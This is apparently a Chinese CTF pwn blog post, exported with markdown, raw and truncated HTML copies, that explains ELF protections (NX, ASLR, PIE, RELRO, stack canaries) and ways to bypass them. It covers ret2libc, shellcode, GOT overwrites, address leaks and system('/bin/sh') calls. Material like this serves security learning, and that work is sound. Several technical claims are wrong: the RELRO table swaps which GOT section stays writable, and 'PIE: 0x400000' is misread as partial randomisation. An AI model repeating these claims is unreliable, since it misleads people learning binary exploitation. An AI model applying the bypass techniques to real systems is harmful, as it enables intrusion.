Linkable Format）文件通常会开启多种保护机制，以抵御常见的漏洞利用手段。理解这些保护机制的原理、检测方法及绕过思路，是成功解题的核心前提。本文将系统梳理 PWN 题目中主流的 ELF 保护机制，并详细分析对应的绕过方案。\n\n## 前置须知  \n- `system(\"sh\")`、`system(\"/bin/sh\")`、`execve(\"/bin/sh\", 0, 0)`等函数可以用来获取 shell 权限。得到shell权限之后就可以`cat flag`了。\n\n## 检测方式\n```shell\nchecksec pwn  # pwn为目标ELF文件\n# 如果报错可以使用\nchecksec --file=pwn\n```\n\n输入以上代码会在终端里显示出ELF的保护机制。\n## 主要保护机制及绕过思路\n### 一、NX（No-eXecute）保护：栈 / 堆不可执行\n\n#### 1. 保护原理\n\nNX（No-eXecute，不可执行）是最基础的 ELF 保护机制之一，其核心作用是**标记栈、堆等数据区域为 “不可执行”**。当程序尝试将数据区域（如栈上的 shellcode）当作代码执行时，CPU 会触发异常，直接终止程序运行，从而阻止攻击者通过注入 shellcode 并执行来获取权限。\n\n#### 2. 检测方法\n\n*   **工具检测**：使用`checksec`，若输出中包含`NX: NX enabled`，则表示开启 NX 保护；若为`NX: NX disabled`，则未开启。\n\n#### 3. 绕过思路\n\nNX 保护的核心是 “阻止数据区域执行”，因此绕过思路围绕 “不依赖数据区域执行代码” 展开，主流方案如下：\n\n1.Ret2Libc：利用系统库函数\n\n\n\n*   **原理**：程序运行时会加载`libc`（C 标准库），而`libc`中包含`system(\"/bin/sh\")`、`execve`等可直接获取 shell 的函数。通过漏洞（如栈溢出）控制程序的返回地址，将其指向`libc`中的`system`函数地址，并构造参数（如`\"/bin/sh\"`的地址），让程序执行`system(\"/bin/sh\")`，从而绕过 NX。\n\n*   **适用场景**：程序泄露了库函数地址，通过该地址可以计算出libc库的base（基址），从而构造指向libc的payload.\n\n\n2.Ret2Shellcode（仅特定场景）\n\n- **原理**：写入shellcode，计算机会执行机器码。\n\n*   **适用场景**：若程序存在 “可执行的数据区域”（如自定义的`rwx`权限段、未开启 NX 的部分区域），可将 shellcode 写入该区域，再通过漏洞控制返回地址跳转到 shellcode 执行。\n\n\n3.Ret2DLOPEN/Ret2DLRESOLVE：动态链接利用\n\n\n\n*   **原理**：利用 ELF 的动态链接机制，通过构造`dlopen`（加载动态库）和`dlsym`（获取库中函数地址）的调用流程，动态加载`libc`并执行`system`函数，无需提前泄露`libc`基地址。\n\n*   **适用场景**：程序未开启 Full RELRO 保护（GOT 表可写），且无法直接泄露`libc`地址时。\n\n### 二、ASLR（Address Space Layout Randomization）：地址空间随机化\n\n#### 1. 保护原理\n\nASLR 是操作系统级的保护机制，其作用是**在程序每次运行时，随机化 ELF 文件的代码段、数据段、堆、栈以及**`libc`**等动态库的加载地址**。攻击者无法提前预测关键地址（如`system`函数、`\"/bin/sh\"`字符串地址），从而阻止 Ret2Libc 等依赖固定地址的利用方式。\n\n\n\n#### 2. 绕过思路\n\nASLR 的核心是 “地址随机”，绕过思路围绕 “获取随机地址的具体值” 或 “利用地址固定的区域” 展开：\n\n1.信息泄露漏洞：获取关键地址\n\n\n\n*   **原理**：通过程序中的信息泄露漏洞（如格式化字符串漏洞、栈溢出导致的内存泄漏、UAF 漏洞），读取内存中已加载的关键地址（如 GOT 表中`libc`函数的真实地址、栈地址、堆地址），再根据地址偏移计算出目标函数（如`system`）或字符串（如`\"/bin/sh\"`）的地址。\n\n*   **常见泄露场景**：\n\n\n    *   格式化字符串漏洞：通过`%p`输出栈上的`libc`地址或栈地址；\n    \n    *   栈溢出泄露：覆盖返回地址前，先泄露栈上保存的`libc`函数地址（如`__libc_start_main`的返回地址）；\n    \n    *   GOT 表泄露：通过漏洞读取 GOT 表中已解析的`libc`函数地址（如`puts`的 GOT 地址）。\n\n2.地址爆破：小范围随机地址尝试\n\n\n\n*   **原理**：若 ASLR 随机化的地址空间较小（如仅低 12 位随机，对应 4KB 内存页），可通过循环发送 payload，尝试所有可能的地址组合，直到命中正确地址。\n\n*   **适用场景**：\n\n\n    *   栈地址随机化范围小（如仅栈基址低 12 位随机）；\n    \n    *   程序可重复运行且无次数限制（如远程题目未限制连接次数）。\n\n3.利用静态地址区域\n\n\n\n\n*   **原理**：若程序未开启 PIE 保护（代码段地址固定），则 ELF 自身的代码段、数据段地址固定，可利用这些区域中的 gadget（代码片段）或字符串构造利用链，无需依赖`libc`地址。\n\n*   **适用场景**：未开启 PIE 保护的程序，且程序自身存在可利用的 gadget 和字符串。\n\n### 三、PIE（Position-Independent Executable）：PIE偏移\n\n#### 1. 保护原理\n\nPIE 是 ELF 文件级的保护机制，其作用是**让 ELF 文件的代码段、数据段、BSS 段等在加载时使用相对地址，而非固定地址**。结合 ASLR 后，程序每次运行时，整个 ELF 文件的加载基地址会随机化，导致攻击者无法提前预测代码段中的 gadget 地址、数据段中的字符串地址等。\n\n#### 2. 检测方法\n\n\n\n*   使用`checksec`，若输出中包含`PIE:    PIE enabled`（或`PIE:    0x400000`等具体基址，代表部分随机），则开启 PIE；若为`PIE:    PIE disabled`，则未开启。\n\n\n#### 3. 绕过思路\n\nPIE 的核心是 “ELF 自身地址随机”，绕过思路与 ASLR 类似，需先获取 ELF 的加载基地址：\n\n- 泄露 ELF 基地址\n\n\n\n    *   **原理**：通过漏洞泄露 ELF 代码段或数据段中的某个已知偏移地址（如`main`函数地址、某个全局变量地址），再根据该地址与 ELF 基地址的偏移，计算出 ELF 的加载基地址。\n    \n    *   **示例**：若泄露的`main`函数真实地址为`0x55a3b7201120`，`ida`显示`main`的偏移为`0x1120`，则 ELF 基地址为`0x55a3b7201120 - 0x1120 = 0x55a3b7200000`。\n\n\n\n\n### 四、RELRO（Relocation Read-Only）：重定位表只读保护\n\n#### 1. 保护原理\n\nRELRO 通过限制 ELF 的 GOT（Global Offset Table，全局偏移表）和 PLT（Procedure Linkage Table，过程链接表）的可写性，防止攻击者通过修改 GOT 表来劫持函数执行流程（如将`puts`的 GOT 表项修改为`system`地址）。RELRO 分为两种级别：\n\n\n\n| 保护级别                    | 原理                                                         | 防护强度              |\n| --------------------------- | ------------------------------------------------------------ | --------------------- |\n| Partial RELRO（部分 RELRO） | 仅将 GOT 表的部分区域设为只读，GOT 表的前半部分（.got）仍可写，后半部分（.got.plt）只读 | 较弱，可修改.got 区域 |\n| Full RELRO（完全 RELRO）    | 将整个 GOT 表设为只读，且在程序启动时提前解析所有动态链接函数（关闭延迟绑定），GOT 表无任何可写区域 | 较强，无法修改 GOT 表 |\n\n#### 2. 检测方法\n\n\n\n*   **工具检测**：使用`checksec`，若输出中包含`RELRO:  Full RELRO`，则开启完全 RELRO；若为`RELRO:  Partial RELRO`，则开启部分 RELRO；若为`RELRO:  No RELRO`，则未开启。\n\n\n#### 3. 绕过思路\n\nRELRO 的核心是 “GOT 表只读”，绕过思路需根据保护级别区分：\n\n1.Partial RELRO：修改可写 GOT 区域\n\n\n\n*   **原理**：Partial RELRO 下，GOT 表的`.got`区域（存储已解析的函数地址）仍可写，攻击者可通过栈溢出、格式化字符串等漏洞修改该区域的函数地址（如将`__libc_start_main`的 GOT 地址修改为`system`地址），实现函数劫持。\n\n*   **示例**：通过格式化字符串漏洞，利用`%n`将`__libc_start_main`的 GOT 表项修改为`system`地址，当程序再次调用`__libc_start_main`时，实际执行`system`。\n\n2.Full RELRO：放弃 GOT 表，寻找其他漏洞\n\n\n\n*   **原理**：Full RELRO 下 GOT 表完全只读，无法修改，因此需放弃 “GOT 表劫持” 思路，转而利用其他类型的漏洞或代码段中的 gadget：\n\n\n    *   **利用栈溢出 + Ret2Gadget**：通过栈溢出控制返回地址，跳转到代码段或`libc`中的 gadget 组合（如`pop ret`、`pop rdi ret`），构造`system(\"/bin/sh\")`的调用流程。\n    \n    *   **利用堆漏洞**：若程序存在堆漏洞（如 UAF、Double Free、Off-by-One），可通过篡改堆块元数据（如`fd`、`bk`指针），实现任意地址写或控制程序执行流，无需依赖 GOT 表。\n\n### 五、Stack Canary（栈金丝雀）：栈溢出检测\n\n#### 1. 保护原理\n\nStack Canary（栈金丝雀）是一种栈溢出检测机制，其核心逻辑是：**在程序启动时，生成一个随机的 “金丝雀” 值，存储在栈帧的 rbp下方（栈溢出的必经之路）。函数返回前，程序会检查金丝雀值是否被篡改，若被篡改（说明发生栈溢出），则立即终止程序**。\n\n#### 2. 检测方法\n\n\n\n*   **工具检测**：使用`checksec`，若输出中包含`Canary:  Canary found`，则开启 Stack Canary；若为`Canary:  No canary found`，则未开启。\n\n#### 3. 绕过思路\n\nStack Canary 的核心是 “随机值保护栈帧”，绕过思路围绕 “获取金丝雀值” 展开：\n\n- 泄露金丝雀值\n\n\n\n    *   **原理**：通过漏洞（如格式化字符串漏洞、栈溢出导致的部分内存泄露）读取栈上存储的金丝雀值，在构造栈溢出 payload 时，将泄露的金丝雀值填充到对应的位置，避免触发`__stack_chk_fail`。\n    \n    *   **常见泄露场景**：\n\n\n        *   格式化字符串漏洞：栈上的金丝雀值可通过`%p`直接输出（需确定金丝雀在栈上的偏移）；\n\n\n    *   **注意事项**：金丝雀值在程序每次运行时随机（结合 ASLR），因此需在同一次程序运行中完成 “泄露金丝雀 + 构造 payload 溢出”。\n\n\n\n\n\n## gdb调试\n\n\n\n  **调试验证**：通过`gdb`动态调试，获取关键地址，从而构造payload。\n\n`vmmap`：查看进程的内存映射情况，获取各个段的地址信息。  \n`reg rsp`：查看当前栈顶指针的值。（system函数调用前会检查rsp向0x10对齐）\n","source":"_posts/Day 02 程序保护机制及绕过思路.md","raw":"---\ntitle: Day 02 程序保护机制即绕过思路\ndate: 2025-08-28\ntags: \n\n  - ubuntu\n  - pwntools\n  - pwndbg\ncategories: pwn\ntop_img: /images/background/03.jpg\ncover: /images/background/02.png\n---\n\n# ELF 文件的常见保护机制及绕过思路\n\n在 Pwn题目中，ELF（Executable and Linkable Format）文件通常会开启多种保护机制，以抵御常见的漏洞利用手段。理解这些保护机制的原理、检测方法及绕过思路，是成功解题的核心前提。本文将系统梳理 PWN 题目中主流的 ELF 保护机制，并详细分析对应的绕过方案。\n\n## 前置须知  \n- `system(\"sh\")`、`system(\"/bin/sh\")`、`execve(\"/bin/sh\", 0, 0)`等函数可以用来获取 shell 权限。得到shell权限之后就可以`cat flag`了。\n\n## 检测方式\n```shell\nchecksec pwn  # pwn为目标ELF文件\n# 如果报错可以使用\nchecksec --file=pwn\n```\n\n输入以上代码会在终端里显示出ELF的保护机制。\n## 主要保护机制及绕过思路\n### 一、NX（No-eXecute）保护：栈 / 堆不可执行\n\n#### 1. 保护原理\n\nNX（No-eXecute，不可执行）是最基础的 ELF 保护机制之一，其核心作用是**标记栈、堆等数据区域为 “不可执行”**。当程序尝试将数据区域（如栈上的 shellcode）当作代码执行时，CPU 会触发异常，直接终止程序运行，从而阻止攻击者通过注入 shellcode 并执行来获取权限。\n\n#### 2. 检测方法\n\n*   **工具检测**：使用`checksec`，若输出中包含`NX: NX enabled`，则表示开启 NX 保护；若为`NX: NX disabled`，则未开启。\n\n#### 3. 绕过思路\n\nNX 保护的核心是 “阻止数据区域执行”，因此绕过思路围绕 “不依赖数据区域执行代码” 展开，主流方案如下：\n\n1.Ret2Libc：利用系统库函数\n\n\n\n*   **原理**：程序运行时会加载`libc`（C 标准库），而`libc`中包含`system(\"/bin/sh\")`、`execve`等可直接获取 shell 的函数。通过漏洞（如栈溢出）控制程序的返回地址，将其指向`libc`中的`system`函数地址，并构造参数（如`\"/bin/sh\"`的地址），让程序执行`system(\"/bin/sh\")`，从而绕过 NX。\n\n*   **适用场景**：程序泄露了库函数地址，通过该地址可以计算出libc库的base（基址），从而构造指向libc的payload.\n\n\n2.Ret2Shellcode（仅特定场景）\n\n- **原理**：写入shellcode，计算机会执行机器码。\n\n*   **适用场景**：若程序存在 “可执行的数据区域”（如自定义的`rwx`权限段、未开启 NX 的部分区域），可将 shellcode 写入该区域，再通过漏洞控制返回地址跳转到 shellcode 执行。\n\n\n3.Ret2DLOPEN/Ret2DLRESOLVE：动态链接利用\n\n\n\n*   **原理**：利用 ELF 的动态链接机制，通过构造`dlopen`（加载动态库）和`dlsym`（获取库中函数地址）的调用流程，动态加载`libc`并执行`system`函数，无需提前泄露`libc`基地址。\n\n*   **适用场景**：程序未开启 Full RELRO 保护（GOT 表可写），且无法直接泄露`libc`地址时。\n\n### 二、ASLR（Address Space Layout Randomization）：地址空间随机化\n\n#### 1. 保护原理\n\nASLR 是操作系统级的保护机制，其作用是**在程序每次运行时，随机化 ELF 文件的代码段、数据段、堆、栈以及**`libc`**等动态库的加载地址**。攻击者无法提前预测关键地址（如`system`函数、`\"/bin/sh\"`字符串地址），从而阻止 Ret2Libc 等依赖固定地址的利用方式。\n\n\n\n#### 2. 绕过思路\n\nASLR 的核心是 “地址随机”，绕过思路围绕 “获取随机地址的具体值” 或 “利用地址固定的区域” 展开：\n\n1.信息泄露漏洞：获取关键地址\n\n\n\n*   **原理**：通过程序中的信息泄露漏洞（如格式化字符串漏洞、栈溢出导致的内存泄漏、UAF 漏洞），读取内存中已加载的关键地址（如 GOT 表中`libc`函数的真实地址、栈地址、堆地址），再根据地址偏移计算出目标函数（如`system`）或字符串（如`\"/bin/sh\"`）的地址。\n\n*   **常见泄露场景**：\n\n\n    *   格式化字符串漏洞：通过`%p`输出栈上的`libc`地址或栈地址；\n    \n    *   栈溢出泄露：覆盖返回地址前，先泄露栈上保存的`libc`函数地址（如`__libc_start_main`的返回地址）；\n    \n    *   GOT 表泄露：通过漏洞读取 GOT 表中已解析的`libc`函数地址（如`puts`的 GOT 地址）。\n\n2.地址爆破：小范围随机地址尝试\n\n\n\n*   **原理**：若 ASLR 随机化的地址空间较小（如仅低 12 位随机，对应 4KB 内存页），可通过循环发送 payload，尝试所有可能的地址组合，直到命中正确地址。\n\n*   **适用场景**：\n\n\n    *   栈地址随机化范围小（如仅栈基址低 12 位随机）；\n    \n    *   程序可重复运行且无次数限制（如远程题目未限制连接次数）。\n\n3.利用静态地址区域\n\n\n\n\n*   **原理**：若程序未开启 PIE 保护（代码段地址固定），则 ELF 自身的代码段、数据段地址固定，可利用这些区域中的 gadget（代码片段）或字符串构造利用链，无需依赖`libc`地址。\n\n*   **适用场景**：未开启 PIE 保护的程序，且程序自身存在可利用的 gadget 和字符串。\n\n### 三、PIE（Position-Independent Executable）：PIE偏移\n\n#### 1. 保护原理\n\nPIE 是 ELF 文件级的保护机制，其作用是**让 ELF 文件的代码段、数据段、BSS 段等在加载时使用相对地址，而非固定地址**。结合 ASLR 后，程序每次运行时，整个 ELF 文件的加载基地址会随机化，导致攻击者无法提前预测代码段中的 gadget 地址、数据段中的字符串地址等。\n\n#### 2. 检测方法\n\n\n\n*   使用`checksec`，若输出中包含`PIE:    PIE enabled`（或`PIE:    0x400000`等具体基址，代表部分随机），则开启 PIE；若为`PIE:    PIE disabled`，则未开启。\n\n\n#### 3. 绕过思路\n\nPIE 的核心是 “ELF 自身地址随机”，绕过思路与 ASLR 类似，需先获取 ELF 的加载基地址：\n\n- 泄露 ELF 基地址\n\n\n\n    *   **原理**：通过漏洞泄露 ELF 代码段或数据段中的某个已知偏移地址（如`main`函数地址、某个全局变量地址），再根据该地址与 ELF 基地址的偏移，计算出 ELF 的加载基地址。\n    \n    *   **示例**：若泄露的`main`函数真实地址为`0x55a3b7201120`，`ida`显示`main`的偏移为`0x1120`，则 ELF 基地址为`0x55a3b7201120 - 0x1120 = 0x55a3b7200000`。\n\n\n\n\n### 四、RELRO（Relocation Read-Only）：重定位表只读保护\n\n#### 1. 保护原理\n\nRELRO 通过限制 ELF 的 GOT（Global Offset Table，全局偏移表）和 PLT（Procedure Linkage Table，过程链接表）的可写性，防止攻击者通过修改 GOT 表来劫持函数执行流程（如将`puts`的 GOT 表项修改为`system`地址）。RELRO 分为两种级别：\n\n\n\n| 保护级别                    | 原理                                                         | 防护强度              |\n| --------------------------- | ------------------------------------------------------------ | --------------------- |\n| Partial RELRO（部分 RELRO） | 仅将 GOT 表的部分区域设为只读，GOT 表的前半部分（.got）仍可写，后半部分（.got.plt）只读 | 较弱，可修改.got 区域 |\n| Full RELRO（完全 RELRO）    | 将整个 GOT 表设为只读，且在程序启动时提前解析所有动态链接函数（关闭延迟绑定），GOT 表无任何可写区域 | 较强，无法修改 GOT 表 |\n\n#### 2. 检测方法\n\n\n\n*   **工具检测**：使用`checksec`，若输出中包含`RELRO:  Full RELRO`，则开启完全 RELRO；若为`RELRO:  Partial RELRO`，则开启部分 RELRO；若为`RELRO:  No RELRO`，则未开启。\n\n\n#### 3. 绕过思路\n\nRELRO 的核心是 “GOT 表只读”，绕过思路需根据保护级别区分：\n\n1.Partial RELRO：修改可写 GOT 区域\n\n\n\n*   **原理**：Partial RELRO 下，GOT 表的`.got`区域（存储已解析的函数地址）仍可写，攻击者可通过栈溢出、格式化字符串等漏洞修改该区域的函数地址（如将`__libc_start_main`的 GOT 地址修改为`system`地址），实现函数劫持。\n\n*   **示例**：通过格式化字符串漏洞，利用`%n`将`__libc_start_main`的 GOT 表项修改为`system`地址，当程序再次调用`__libc_start_main`时，实际执行`system`。\n\n2.Full RELRO：放弃 GOT 表，寻找其他漏洞\n\n\n\n*   **原理**：Full RELRO 下 GOT 表完全只读，无法修改，因此需放弃 “GOT 表劫持” 思路，转而利用其他类型的漏洞或代码段中的 gadget：\n\n\n    *   **利用栈溢出 + Ret2Gadget**：通过栈溢出控制返回地址，跳转到代码段或`libc`中的 gadget 组合（如`pop ret`、`pop rdi ret`），构造`system(\"/bin/sh\")`的调用流程。\n    \n    *   **利用堆漏洞**：若程序存在堆漏洞（如 UAF、Double Free、Off-by-One），可通过篡改堆块元数据（如`fd`、`bk`指针），实现任意地址写或控制程序执行流，无需依赖 GOT 表。\n\n### 五、Stack Canary（栈金丝雀）：栈溢出检测\n\n#### 1. 保护原理\n\nStack Canary（栈金丝雀）是一种栈溢出检测机制，其核心逻辑是：**在程序启动时，生成一个随机的 “金丝雀” 值，存储在栈帧的 rbp下方（栈溢出的必经之路）。函数返回前，程序会检查金丝雀值是否被篡改，若被篡改（说明发生栈溢出），则立即终止程序**。\n\n#### 2. 检测方法\n\n\n\n*   **工具检测**：使用`checksec`，若输出中包含`Canary:  Canary found`，则开启 Stack Canary；若为`Canary:  No canary found`，则未开启。\n\n#### 3. 绕过思路\n\nStack Canary 的核心是 “随机值保护栈帧”，绕过思路围绕 “获取金丝雀值” 展开：\n\n- 泄露金丝雀值\n\n\n\n    *   **原理**：通过漏洞（如格式化字符串漏洞、栈溢出导致的部分内存泄露）读取栈上存储的金丝雀值，在构造栈溢出 payload 时，将泄露的金丝雀值填充到对应的位置，避免触发`__stack_chk_fail`。\n    \n    *   **常见泄露场景**：\n\n\n        *   格式化字符串漏洞：栈上的金丝雀值可通过`%p`直接输出（需确定金丝雀在栈上的偏移）；\n\n\n    *   **注意事项**：金丝雀值在程序每次运行时随机（结合 ASLR），因此需在同一次程序运行中完成 “泄露金丝雀 + 构造 payload 溢出”。\n\n\n\n\n\n## gdb调试\n\n\n\n  **调试验证**：通过`gdb`动态调试，获取关键地址，从而构造payload。\n\n`vmmap`：查看进程的内存映射情况，获取各个段的地址信息。  \n`reg rsp`：查看当前栈顶指针的值。（system函数调用前会检查rsp向0x10对齐）\n","slug":"Day 02 程序保护机制及绕过思路","published":1,"updated":"2025-09-22T06:11:35.766Z","_id":"cmeut9edl0003kot8599lcehv","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"ELF-文件的常见保护机制及绕过思路\"><a href=\"#ELF-文件的常见保护机制及绕过思路\" class=\"headerlink\" title=\"ELF 文件的常见保护机制及绕过思路\"></a>ELF 文件的常见保护机制及绕过思路</h1><p>在 Pwn题目中，ELF（Executable and Linkable Format）文件通常会开启多种保护机制，以抵御常见的漏洞利用手段。理解这些保护机制的原理、检测方法及绕过思路，是成功解题的核心前提。本文将系统梳理 PWN 题目中主流的 ELF 保护机制，并详细分析对应的绕过方案。</p>\n<h2 id=\"前置须知\"><a href=\"#前置须知\" class=\"headerlink\" title=\"前置须知\"></a>前置须知</h2><ul>\n<li><code>system(&quot;sh&quot;)</code>、<code>system(&quot;/bin/sh&quot;)</code>、<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>等函数可以用来获取 shell 权限。得到shell权限之后就可以<code>cat flag</code>了。</li>\n</ul>\n<h2 id=\"检测方式\"><a href=\"#检测方式\" class=\"headerlink\" title=\"检测方式\"></a>检测方式</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checksec pwn  # pwn为目标ELF文件</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果报错可以使用</span></span><br><span class=\"line\">checksec --file=pwn</span><br></pre></td></tr></table></figure>\n\n<p>输入以上代码会在终端里显示出ELF的保护机制。</p>\n<h2 id=\"主要保护机制及绕过思路\"><a href=\"#主要保护机制及绕过思路\" class=\"headerlink\" title=\"主要保护机制及绕过思路\"></a>主要保护机制及绕过思路</h2><h3 id=\"一、NX（No-eXecute）保护：栈-堆不可执行\"><a href=\"#一、NX（No-eXecute）保护：栈-堆不可执行\" class=\"headerlink\" title=\"一、NX（No-eXecute）保护：栈 &#x2F; 堆不可执行\"></a>一、NX（No-eXecute）保护：栈 &#x2F; 堆不可执行</h3><h4 id=\"1-保护原理\"><a href=\"#1-保护原理\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>NX（No-eXecute，不可执行）是最基础的 ELF 保护机制之一，其核心作用是<strong>标记栈、堆等数据区域为 “不可执行”</strong>。当程序尝试将数据区域（如栈上的 shellcode）当作代码执行时，CPU 会触发异常，直接终止程序运行，从而阻止攻击者通过注入 shellcode 并执行来获取权限。</p>\n<h4 id=\"2-检测方法\"><a href=\"#2-检测方法\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li><strong>工具检测</strong>：使用<code>checksec</code>，若输出中包含<code>NX: NX enabled</code>，则表示开启 NX 保护；若为<code>NX: NX disabled</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路\"><a href=\"#3-绕过思路\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>NX 保护的核心是 “阻止数据区域执行”，因此绕过思路围绕 “不依赖数据区域执行代码” 展开，主流方案如下：</p>\n<p>1.Ret2Libc：利用系统库函数</p>\n<ul>\n<li><p><strong>原理</strong>：程序运行时会加载<code>libc</code>（C 标准库），而<code>libc</code>中包含<code>system(&quot;/bin/sh&quot;)</code>、<code>execve</code>等可直接获取 shell 的函数。通过漏洞（如栈溢出）控制程序的返回地址，将其指向<code>libc</code>中的<code>system</code>函数地址，并构造参数（如<code>&quot;/bin/sh&quot;</code>的地址），让程序执行<code>system(&quot;/bin/sh&quot;)</code>，从而绕过 NX。</p>\n</li>\n<li><p><strong>适用场景</strong>：程序泄露了库函数地址，通过该地址可以计算出libc库的base（基址），从而构造指向libc的payload.</p>\n</li>\n</ul>\n<p>2.Ret2Shellcode（仅特定场景）</p>\n<ul>\n<li><strong>原理</strong>：写入shellcode，计算机会执行机器码。</li>\n</ul>\n<ul>\n<li><strong>适用场景</strong>：若程序存在 “可执行的数据区域”（如自定义的<code>rwx</code>权限段、未开启 NX 的部分区域），可将 shellcode 写入该区域，再通过漏洞控制返回地址跳转到 shellcode 执行。</li>\n</ul>\n<p>3.Ret2DLOPEN&#x2F;Ret2DLRESOLVE：动态链接利用</p>\n<ul>\n<li><p><strong>原理</strong>：利用 ELF 的动态链接机制，通过构造<code>dlopen</code>（加载动态库）和<code>dlsym</code>（获取库中函数地址）的调用流程，动态加载<code>libc</code>并执行<code>system</code>函数，无需提前泄露<code>libc</code>基地址。</p>\n</li>\n<li><p><strong>适用场景</strong>：程序未开启 Full RELRO 保护（GOT 表可写），且无法直接泄露<code>libc</code>地址时。</p>\n</li>\n</ul>\n<h3 id=\"二、ASLR（Address-Space-Layout-Randomization）：地址空间随机化\"><a href=\"#二、ASLR（Address-Space-Layout-Randomization）：地址空间随机化\" class=\"headerlink\" title=\"二、ASLR（Address Space Layout Randomization）：地址空间随机化\"></a>二、ASLR（Address Space Layout Randomization）：地址空间随机化</h3><h4 id=\"1-保护原理-1\"><a href=\"#1-保护原理-1\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>ASLR 是操作系统级的保护机制，其作用是<strong>在程序每次运行时，随机化 ELF 文件的代码段、数据段、堆、栈以及</strong><code>libc</code><strong>等动态库的加载地址</strong>。攻击者无法提前预测关键地址（如<code>system</code>函数、<code>&quot;/bin/sh&quot;</code>字符串地址），从而阻止 Ret2Libc 等依赖固定地址的利用方式。</p>\n<h4 id=\"2-绕过思路\"><a href=\"#2-绕过思路\" class=\"headerlink\" title=\"2. 绕过思路\"></a>2. 绕过思路</h4><p>ASLR 的核心是 “地址随机”，绕过思路围绕 “获取随机地址的具体值” 或 “利用地址固定的区域” 展开：</p>\n<p>1.信息泄露漏洞：获取关键地址</p>\n<ul>\n<li><p><strong>原理</strong>：通过程序中的信息泄露漏洞（如格式化字符串漏洞、栈溢出导致的内存泄漏、UAF 漏洞），读取内存中已加载的关键地址（如 GOT 表中<code>libc</code>函数的真实地址、栈地址、堆地址），再根据地址偏移计算出目标函数（如<code>system</code>）或字符串（如<code>&quot;/bin/sh&quot;</code>）的地址。</p>\n</li>\n<li><p><strong>常见泄露场景</strong>：</p>\n<ul>\n<li><p>格式化字符串漏洞：通过<code>%p</code>输出栈上的<code>libc</code>地址或栈地址；</p>\n</li>\n<li><p>栈溢出泄露：覆盖返回地址前，先泄露栈上保存的<code>libc</code>函数地址（如<code>__libc_start_main</code>的返回地址）；</p>\n</li>\n<li><p>GOT 表泄露：通过漏洞读取 GOT 表中已解析的<code>libc</code>函数地址（如<code>puts</code>的 GOT 地址）。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>2.地址爆破：小范围随机地址尝试</p>\n<ul>\n<li><p><strong>原理</strong>：若 ASLR 随机化的地址空间较小（如仅低 12 位随机，对应 4KB 内存页），可通过循环发送 payload，尝试所有可能的地址组合，直到命中正确地址。</p>\n</li>\n<li><p><strong>适用场景</strong>：</p>\n<ul>\n<li><p>栈地址随机化范围小（如仅栈基址低 12 位随机）；</p>\n</li>\n<li><p>程序可重复运行且无次数限制（如远程题目未限制连接次数）。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>3.利用静态地址区域</p>\n<ul>\n<li><p><strong>原理</strong>：若程序未开启 PIE 保护（代码段地址固定），则 ELF 自身的代码段、数据段地址固定，可利用这些区域中的 gadget（代码片段）或字符串构造利用链，无需依赖<code>libc</code>地址。</p>\n</li>\n<li><p><strong>适用场景</strong>：未开启 PIE 保护的程序，且程序自身存在可利用的 gadget 和字符串。</p>\n</li>\n</ul>\n<h3 id=\"三、PIE（Position-Independent-Executable）：PIE偏移\"><a href=\"#三、PIE（Position-Independent-Executable）：PIE偏移\" class=\"headerlink\" title=\"三、PIE（Position-Independent Executable）：PIE偏移\"></a>三、PIE（Position-Independent Executable）：PIE偏移</h3><h4 id=\"1-保护原理-2\"><a href=\"#1-保护原理-2\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>PIE 是 ELF 文件级的保护机制，其作用是<strong>让 ELF 文件的代码段、数据段、BSS 段等在加载时使用相对地址，而非固定地址</strong>。结合 ASLR 后，程序每次运行时，整个 ELF 文件的加载基地址会随机化，导致攻击者无法提前预测代码段中的 gadget 地址、数据段中的字符串地址等。</p>\n<h4 id=\"2-检测方法-1\"><a href=\"#2-检测方法-1\" class=\"headerlink\" title=\"2. 检测方法\"></a>2. 检测方法</h4><ul>\n<li>使用<code>checksec</code>，若输出中包含<code>PIE:    PIE enabled</code>（或<code>PIE:    0x400000</code>等具体基址，代表部分随机），则开启 PIE；若为<code>PIE:    PIE disabled</code>，则未开启。</li>\n</ul>\n<h4 id=\"3-绕过思路-1\"><a href=\"#3-绕过思路-1\" class=\"headerlink\" title=\"3. 绕过思路\"></a>3. 绕过思路</h4><p>PIE 的核心是 “ELF 自身地址随机”，绕过思路与 ASLR 类似，需先获取 ELF 的加载基地址：</p>\n<ul>\n<li><p>泄露 ELF 基地址</p>\n<ul>\n<li><p><strong>原理</strong>：通过漏洞泄露 ELF 代码段或数据段中的某个已知偏移地址（如<code>main</code>函数地址、某个全局变量地址），再根据该地址与 ELF 基地址的偏移，计算出 ELF 的加载基地址。</p>\n</li>\n<li><p><strong>示例</strong>：若泄露的<code>main</code>函数真实地址为<code>0x55a3b7201120</code>，<code>ida</code>显示<code>main</code>的偏移为<code>0x1120</code>，则 ELF 基地址为<code>0x55a3b7201120 - 0x1120 = 0x55a3b7200000</code>。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"四、RELRO（Relocation-Read-Only）：重定位表只读保护\"><a href=\"#四、RELRO（Relocation-Read-Only）：重定位表只读保护\" class=\"headerlink\" title=\"四、RELRO（Relocation Read-Only）：重定位表只读保护\"></a>四、RELRO（Relocation Read-Only）：重定位表只读保护</h3><h4 id=\"1-保护原理-3\"><a href=\"#1-保护原理-3\" class=\"headerlink\" title=\"1. 保护原理\"></a>1. 保护原理</h4><p>RELRO 通过限制 ELF 的 GOT（Global Offset Table，全局偏移表）和 PLT（Procedure Linkage Table，过程链接表）的可写性，防止攻击者通过修改 GOT 表来劫持函数执行流程（如将<code>puts</code>的 GOT 表项修改为<code>system</code>地址）。RELRO 分为两种级别：</p>\n<table>\n<thead>\n<tr>\n<th>保护级别</th>\n<th>原理</th>\n<th>防护强度</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Partial 